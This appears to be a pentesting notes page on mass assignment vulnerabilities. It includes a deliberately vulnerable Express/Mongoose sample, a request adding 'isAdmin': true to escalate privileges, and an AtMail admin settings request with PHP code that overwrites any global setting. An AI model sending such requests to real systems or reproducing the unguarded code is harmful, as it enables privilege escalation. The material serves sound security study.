# Mass Assignment vulnerability

Mass assignment is a type of security vulnerability that occurs when an application code allows user-provided data to be used to set properties on an object without verifying that the user has the right to do so.

Many web application frameworks offer an active record and object-relational mapping features, where external data in serialization formats is automatically converted on input into internal objects and, in turn, into database record fields. If the framework's interface for that conversion is too permissive and the application designer doesn't mark specific fields as immutable, it is possible to overwrite fields that were never intended to be modified from outside.

This vulnerability opens to other scenarios, like:
- [Access control vulnerabilities](Access%20control%20vulnerabilities.md)
- [Prototype Pollution server-side](Prototype%20Pollution%20server-side.md)
- [Authentication Attacks](Authentication%20Attacks.md)

## Privilege escalation exploiting mass assignment

Standard API request for creating a user:

```http
POST /user/create HTTP/1.1
Host: test.com

{
“username” : “jane.doe”,
“password” : “C0rr3ctH0r$3B@tt3rySt@pl3”,
“email” : “jane@somecompany.com”
}
```

If the backend do not check which data has been sent in the body and assumes they are all expected parameters, an attacker can escalate his privileges.
A vulnerable sample code is the one below:

```js
const express = require('express');
const mongoose = require('mongoose');
const jsonParser = require('body-parser').json();
var User = null;
const app = express();
const port = 3000;

app.post('/user/create', jsonParser, async function(req, res) {
    ...
    var newUser = new User(req.body);
    await newUser.save(function(err) {
        if (err) {
            res.status(500);
            res.send(err);
        }
    });
    res.send(newUser);
});

mongoose.connect('mongodb://localhost:27017/supercloudcrm', {
        useNewUrlParser: true
    })
    .then(() => {
        const userSchema = mongoose.Schema({
            username: String,
            password: String,
            email: String,
            isAdmin: bool
        });
        User = mongoose.model('User', userSchema);

        app.listen(port, () => {
            console.log(`Listening on http://0.0.0.0:${port}`);
        });

    });
```

The vulnerability can be exploited sending a request containing an unexpected `isAdmin` value:
```http
POST /user/create HTTP/1.1
Host: test.com

{
“username” : “jane.doe”,
“password” : “C0rr3ctH0r$3B@tt3rySt@pl3”,
“email” : “jane@somecompany.com”,
"isAdmin": true
}
```

## Update read-only data using mass assignment

In AtMail the `tmpFolderBaseName` variable is set (and saved in the DB) the first time the product is installed and then cannot be altered in any way from the application. For a vulnerability chain, however, we need to update that variable.

The request in charge of updating application settings is `globalsave`:
```http
POST /index.php/admin/settings/globalsave HTTP/1.1
Host: atmail
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://atmail/index.php/admin/index/login
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 834
Cookie: atmail6=9sa5pic6s1sqsa38iqlencctl5; atmail6_admin=hr0e0hv45ce0t2rkjne561sb57
Connection: close

save=1&fields%5Badmin_email%5D=postmaster%40mydomain.com&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&dovecot%5BauthType%5D=sql&dovecot%5BldapType%5D=openldap&dovecot%5Bldap_bindauth%5D=1&dovecot%5Bldap_host%5D=&dovecot%5Bldap_binddn%5D=&dovecot%5Bldap_bindpass%5D=&dovecot%5Bldap_basedn%5D=&dovecot%5Bldap_passwdfield%5D=&dovecot%5Bldap_passfilter%5D=&dovecot%5Bldap_bindauth%5D=1&dovecot%5Bldap_bindauthdn%5D=cn%3D%25u%2Cdc%3Ddomain%2Cdc%3Dorg&userPasswordEncryptionTypeCurrent=PLAIN&fields%5BuserPasswordEncryptionType%5D=PLAIN&externalUserPasswordEncryptionTypeCurrent=PLAIN&fields%5BexternalUserPasswordEncryptionType%5D=PLAIN&fields%5Bmaster_key%5D=&fields%5Blog_purge_days%5D=180&fields%5Bdebug%5D=0
```

The code updating configuration data is the one below:
```php
...
config::save( 'global', $this->requestParams['fields'] );
...
class config{
	...
	public static function save($sectionNode, $newConfig){
		...
		foreach($newConfig as $newKey => $newValue){
			//blindly update the config object - just incase used elsewhere then will be updated
			$configObj->$sectionNode[$newKey] = $newValue;
			//go through each responce field
			$responseMatchFoundInDb = false;
			foreach($existingConfig as $existingRow){
				//go thorugh each db row looking for a match (only update exsting)
				if( $existingRow['keyName'] == $newKey ){
					...
				}else{
					$existingRow['keyValue'] = trim($newValue);
					$result = $dbAdapter->update($dbConfig->database->params->configtable,$existingRow, $dbAdapter->quoteinto('configId = ?',$existingRow['configId']) );
				}
			}
		}
	}
}
```

>[!bug]
>The code allows us to successfully update any global setting of our choosing since there are no implemented checks on which settings are updated


# External References

- [Mass assignment vulnerability](https://en.wikipedia.org/wiki/Mass_assignment_vulnerability), Wikipedia
- [Mass assignment](https://learn.snyk.io/lessons/mass-assignment/javascript/), Snyk
- [Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html), OWASP